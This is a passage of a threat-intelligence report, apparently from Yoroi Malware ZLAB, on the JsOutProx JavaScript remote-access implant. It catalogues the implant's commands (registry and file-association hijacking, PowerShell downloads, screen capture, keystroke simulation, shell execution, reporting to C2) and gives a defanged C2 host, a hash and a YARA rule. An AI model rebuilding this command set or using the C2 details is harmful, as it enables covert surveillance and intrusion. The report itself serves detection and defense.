+["screenResolution"] 
+
+['Os'] Retrieve the screen resolution through WMI command 
+["wmiScreenResolution"] 
+
+['Os'] Retrieve the number of monitors through WMi command 
+["wmiMonitorCount"] 
+
+['Os']["arch"] Retrieve the CPU architecture info 
+
+['Os']["volumeSerial"] Retrieve the Serial of the disk 
+
+['Os']["version"] Retrieve the OS version through winmgmts command 
+
+['Os']["version2"] Retrieve the OS version using the ['Os']["version"] primitive 
+
+['Os']["windowsXp"] Check is WindowsXP 
+
+['Os']["majorVersion"] Retrieve only the major version 
+
+["Registry"] A sort of constructor of Registry commands 
+
+["Registry"]["HKCR"] = Set a sort of instance variable for HKCR 
+0x80000000 
+
+["Registry"]["HKCU"] = Set a sort of instance variable for HKCU 
+0x80000001 
+
+["Registry"]["HKLM"] = Set a sort of instance variable for HKLM 
+0x80000002 
+
+["Registry"]["HKUS"] = Set a sort of instance variable for HKUS 
+0x80000003 
+
+["Registry"]["HKCC"] = Set a sort of instance variable for HKCC 
+0x80000005 
+
+7/13
+
+
+
+["Registry"]["STRING"] = Set a sort of instance variable for String Variable 
+0x0 
+
+["Registry"]["BINARY"] = Set a sort of instance variable for Binary Variable 
+0x1 
+
+["Registry"]["DWORD"] = Set a sort of instance variable for DWORD variable 
+0x2 
+
+["Registry"]["QWORD"] = Set a sort of instance variable for QWORD Varibale 
+0x3 
+
+["Registry"] Set a sort of instance variable for 32 bit key 
+["WOW64_32KEY"] =
+0x20 
+
+["Registry"] Set a sort of instance variable for 64 bit key 
+["WOW64_64KEY"] =
+0x40 
+
+["Registry"]["provider"] Get the provider to access to Registry 
+
+["Registry"]["write"] Wrtie a Registry key 
+
+["Registry"]["keyExists"] Check if a registry key exists 
+
+["Registry"]["read"] Read a Registry key 
+
+["Registry"]["remove"] Remove a registry key 
+
+["Registry"] Remove the value of a registry key 
+["removeValue"] 
+
+["Registry"]["create"] Create a registry key 
+
+["Stream"] A sort of Constructor for Stream Utility 
+
+["Stream"] Convert a string to a byte array stream 
+["stringToBytes"] 
+
+["Stream"] Convert a byte array string to a string 
+["bytesToString"] 
+
+["XmlEncoding"] A sort of Constructor for XmlEncoding Utility 
+
+["XmlEncoding"] Encode a string in Microsoft.XMLDOM format using ["XmlEncoding"]["encode"] commadn 
+["encodeString"] 
+
+["XmlEncoding"] Encode a Stream in Microsoft.XMLDOM format 
+["encode"] 
+
+["XmlEncoding"] Encode a file in Microsoft.XMLDOM format 
+["encodeFile"] 
+
+["XmlEncoding"] Decode a Stream encoded in Microsoft.XMLDOM format 
+["decode"] 
+
+["XmlEncoding"]  Decode a String encoded in Microsoft.XLDOM format 
+["decodeString"] 
+
+["Association"] A sort of constructor for Association commands 
+
+["Association"] Prepare a Command line to execute through [“Process”] commands 
+["createAssocCmd"] 
+
+["Association"] Prepare a command line string to pass to methods 
+["createAssoc"] 
+
+["Association"] Create a new process command line 
+["createTypeCmd"] 
+
+["Association"] Create a command line to exec by writing a command inside "HKCR\\{0}\\shell\\open\\command\\" registry key 
+["createType"] 
+
+["Association"] Remove an associaction through another command line 
+["removeAssocCmd"] 
+
+["Association"] Remove an association through the registry key 
+["removeTypeCmd"] 
+
+8/13
+
+
+
+["Association"] Remove the prepared command line 
+["removeAssoc"] 
+
+["Association"] Remove the prepared command ilne to pass to the registry key 
+["removeType"] 
+
+["AssociationPlugin"] A sort of constructor for the AssociationPlugin 
+
+["AssociationPlugin"] A listener for the Commands to exec to Association. The commands are: "as.g": Send to the C2 through [Http][Send] t
+["receive"] 
+
+["Download"] A sort of constructor for Download comamnd 
+
+["Download"]["pShell"] Download a file through a Powershell command 
+
+["DownloadPlugin"] A sort of constructor for Download Plugin 
+
+["DownloadPlugin"] A listener for the DownloadPlugin module. The command is named “do.n” 
+["receive"] 
+
+["File"] A sort of constructor for File commands 
+
+["File"]["waitFor"] Wait for a specific Date 
+
+["File"]["getParentPath"] Retrieve the parent Path 
+
+["File"]["getFileName"] Retrieve the File name of the malware 
+
+["File"]["remove"] Remove a file 
+
+["File"]["copy"] Copy a File 
+
+["File"]["move"] Move a File 
+
+["File"]["createFolder"] Create a Folder 
+
+["File"]["removeEx"] Remove a File or directory through cmd line 
+
+["File"]["copyEx"] Copy a file or directory through cmd line 
+
+["File"]["moveEx"] Move a file or directory through cmd line  
+
+["File"]["rename"] Rename a file or directory 
+
+["File"]["createFolderEx"] Create a folder though cmd line 
+
+["File"]["getInfo"] Retrieve the info of a folder or a file 
+
+["File"]["getSize"] Retrieve the size of a folder or a file 
+
+["File"]["exists"] Check if a file or a folder exists 
+
+["File"]["fileExists"] Check if a file exists 
+
+["File"]["folderExists"] Check if a folder exists 
+
+["File"]["driveExists"] Check if a drive Exists 
+
+["File"]["expandPath"] Expand the Environmental strings 
+
+["File"]["getFileSize"] Retrieve a file size 
+
+["File"]["getFolderSize"] Retrieve a Folder Size 
+
+["File"]["deleteFile"] Delete a file 
+
+["File"]["deleteFolder"] Delete a Folder 
+
+["File"]["copyFile"] Copy a File 
+
+["File"]["moveFile"] Move a File 
+
+["File"]["copyFolder"] Copy a folder 
+
+["File"]["moveFolder"] Move a Folder 
+
+["File"]["getFileInfo"] Retrieve the information of a file 
+
+["File"]["getFolderInfo"] Retrieve the folder info 
+
+9/13
+
+
+
+["File"]["unZip"] Unzip all zip file inside a folder 
+
+["File"]["createZip"] Create a zip 
+
+["File"]["zip"] Zip a file 
+
+["File"]["writeAllText"] Write a Text through getXObject 
+
+["File"]["readAllBytes"] Read a binary file through getXObjext 
+
+["File"]["writeAllBytes"] Write all bytes 
+
+["File"]["dumpDrives"] Enumerate all the drives drives 
+
+["File"]["dumpPath"] Enumerate all the files inside a folder 
+
+["File"]["spawn"] Execute a new File (exe or script) 
+
+["File"]["getPreview"] Get a preview of an image File through a powershell script 
+
+["FilePlugin"] A constructor for FilePlugin 
+
+["FilePlugin"]["receive"] A listener of the commands of file. The commands are: “fi.dv” Send to the c2 the dumpfiles  “fi.g” Send to the C2 the fo
+Invoke addRegistry command 
+
+["InfoPlugin"] A constructor for InfoPlugin command 
+
+["InfoPlugin"]["receive"] A listener of the unique command “in.g”, where the malware sends to the C2 a long series of information about the vic
+
+["JavaInstall"]  A constructor for JavaInstall command 
+
+["JavaInstall"]["install"]  Install JRE by downloading it from the C2 
+
+["JavaInstall"]  Uninstall Java 
+["unInstall"] 
+
+["JavaInstallPlugin"]  A constructor for JavaInstallPlugin 
+
+["JavaInstallPlugin"]  A listener to install or check the installation of JRE through the commands “jv.i” and “jv.st” 
+["receive"] 
+
+["MultiView"] A constructor of Multiview module commands 
+
+["MultiView"] Retrieve a ForegroundWindows through a custom PowerShell script 
+["getCaption"] 
+
+["MultiViewPlugin"] A constructor for the MultiViewPlugin module commands 
+
+["MultiViewPlugin"] A variable indicating the quality of the foregound window 
+["Quality"] = 0x64 
+
+["MultiViewPlugin"] A variable indicating the scaling of the foreground window 
+["Scale"] = 0xa 
+
+["MultiViewPlugin"] A listener to the commands of MultiView Plugin which are: “mv.st”: set Quality and Scale “mv.s”: capture the screen th
+["receive"] 
+
+["Process"] A constructor for Process module utility 
+
+["Process"]["list"] List all the active processes 
+
+["Process"]["dump"] Retrieve the following information from all
+processes: Caption CommandLine CreationClassName CreationDate CSCreationClassName CSName Description E
+
+["Process"]["taskkillId"] Kill a process by ID through taskkill 
+
+["Process"] Kill a process by Name through taskkill 
+["taskkillName"] 
+
+["Process"] Kill a process by ID through Process Terminate 
+["terminateId"] 
+
+["Process"] Kill a process by name through Process Terminate 
+["terminateName"] 
+
+["Process"]["createWmi"] Create a Wmi provider through  WbemScripting.SWbemLocator 
+
+["Process"] Create a process using "winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2" 
+["createProcess"] 
+
+10/13
+
+
+
+["Process"] Retrieve a pointer to a process by ID 
+["getProcessByID"] 
+
+["Process"] Retrieve a pointer to a process by name 
+["getProcessByName"] 
+
+["Process"]["currentPID"] Retrieve the current ID 
+
+["Process"] Retrieve the current ID through a PowerShell 
+["currentPIDPS"] 
+
+["ProcessPlugin"] A constructor for ProcessPlugin module  
+
+["ProcessPlugin"] A listener for the following commands: “pr.g”: send to the C2 the result of the operation of Process dump “pr.kli”: Invok
+["receive"] 
+
+["ScreenPShell"] A constructor for ScreenPShell module 
+
+["ScreenPShell"] Get a screenshot through a PowerShell script 
+["capture"] 
+
+["ScreenPShell"] Simulate the pression of a keystroke 
+["pressKeyCode"] 
+
+["ScreenPShell"] Simulate the pression of a keystroke 
+["pressKeyChar"] 
+
+["ScreenPShell"] Invoke Wsh sendKeys 
+["sendkeys"] 
+
+["ScreenPShell"] Simulate the navigation  
+["leftDown"] 
+
+["ScreenPShell"] Simulate the navigation 
+["leftUp"] 
+
+["ScreenPShell"] Simulate the navigation 
+["leftClick"] 
+
+["ScreenPShell"] Simulate the navigation 
+["doubleClick"] 
+
+["ScreenPShell"] Simulate the navigation 
+["rightDown"] 
+
+["ScreenPShell"] Simulate the navigation 
+["rightUp"] 
+
+["ScreenPShell"] Simulate the navigation 
+["rightClick"] 
+
+["ScreenPShell"] Simulate the navigation 
+["mouseWheel"] 
+
+["ScreenPShell"] Simulate the navigation 
+["scrollUp"] 
+
+["ScreenPShell"] Simulate the navigation 
+["scrollDown"] 
+
+["ScreenPShell"] Simulate the navigation 
+["move"] 
+
+["ScreenPShell"] Simulate the navigation 
+["getAction"] 
+
+["ScreenPShell"] Simulate the navigation 
+["clickAction"] 
+
+["ScreenPShellPlugin"] A constructor for ScreenPShellPlugin 
+
+["ScreenPShellPlugin"] A variable for OldSize property 
+["OldSize"] = 0x0 
+
+["ScreenPShellPlugin"]  A variable for Quality property 
+["Quality"] = 0xf 
+
+11/13
+
+
+
+["ScreenPShellPlugin"] A variable for ScreenNumber property 
+["ScreenNumber"] =
+-0x1 
+
+["ScreenPShellPlugin"] A variable for CaptureMouse property 
+["CaptureMouse"] = !![] 
+
+["ScreenPShellPlugin"] A listener for the ScreenPShell for the following commands: “sp.set”: invoke capture mouse “sp.g”:  send to C2 the ca
+["receive"] 
+
+["Shell"] = {}  A constructor for Shell command module 
+
+["Shell"]["codePage"] Retrieve the codePage by reading the registry key "HKLM\SYSTEM\CurrentControlSet\Control\Nls\CodePage\OEMC
+
+["Shell"]["run"] Execute a command through Wsh 
+
+["Shell"]["shellExecute"] Execute a command through ShellExecute 
+
+["Shell"]["getOutput"] Read a log file of a shell command 
+
+["ShellPlugin"] A constructor for ShellPlugin 
+
+["ShellPlugin"]["receive"] A listener for ShellPlugin for the following command: “cn.e”: send to the C2 the get getOutput 
+
+["Shortcut"] A constructor for Shortcut command 
+
+["Shortcut"]["create"] Create a Shortcut  
+
+["Shortcut"]["dump"] Extract the information of a shortcut 
+
+["Shortcut"]["getTarget"] Retrieve the Target of a Shortcut 
+
+["Shortcut"]["run"] Execute a shortcut file 
+
+["ShortcutPlugin"] A constructor for Shortcut plugin  
+
+["ShortcutPlugin"] A listener for ShortcutPlugin excuting the following command: "sh.g": send to the C2 the info retrieved from Shortcut D
+["receive"] 
+
+Table 3: Interpreted Commands list 
+
+The Initialization 
+At this point, we talk about the initialization of the malware. Inspecting the code after the decoding routine we noticed a simple if-else check to
+decide how to execute the malicious code.
+
+The code structure is essential but provides confirmation about the preferred initial vectors to deliver the malicious implant. The Javascript
+malware is designed to be interpreted by the "WScript.exe" windows interpreter and through the "MSHTA" utility, a widely abused LoLBins
+(T1218).
+
+Figure 7: Init routine 
+
+Conclusion 
+The JsOutProx malware is an example of how threat actor abuses high-level scripting language to realize fully functional implants, easily
+evading traditional signature-based detection tools that are typically good at spotting binaries, not text.
+
+The implant is increasing its sophisticated for three reasons: the obfuscation is becoming increasingly intense and can avoid the initial
+detection, the newer versions dropped the in-memory .NET modules and adopted a proxy process plugin architecture to enhance the survival
+of the main infection routine, also, the introduction of the “view-only mode” represents a notable change in the flexibility of this malicious tool
+that could be also configured to have the lowest footprint possible while keeping eyes on the victim’s desktop.
+
+Silent attacks such as this one are hard to spot with traditional security. Yoroi protects its customers from this threat leveraging its proprietary
+automated malware sandbox technology, Yomi sandbox, to analyze and detect any sign of infection, even the weakest.
+
+Indicators of Compromise 
+
+12/13
+
+
+
+Hash: 
+65987f95b365501579431ea8dec1d45940430d8c9defad58908a14e6fb96a347 
+
+C2: 
+dilideanter.]zapto.]org
+hxxp://dilideanter.]zapto.]org[:7272/ 
+
+Yara Rules 
+rule JsOutProx_v2 {  
+
+meta:  
+     description = "Yara Rule for JsOutProx_v2"  
+     author = "Yoroi Malware Zlab"  
+     last_updated = "2021_07_29"  
+     tlp = "white"  
+     category = "informational"  
+ 
+
+strings:  
+   $s1= /uA\[[a-zA-Z]/ ascii wide 
+   $s2= /u[A-Z]\(/ ascii wide 
+
+condition:  
+   #s1>800 and #s2>4000 and (filesize > 1500KB) 
+    
+} 
+
+This blog post was authored by Luigi Martire and Luca Mella of Yoroi Malware ZLAB.
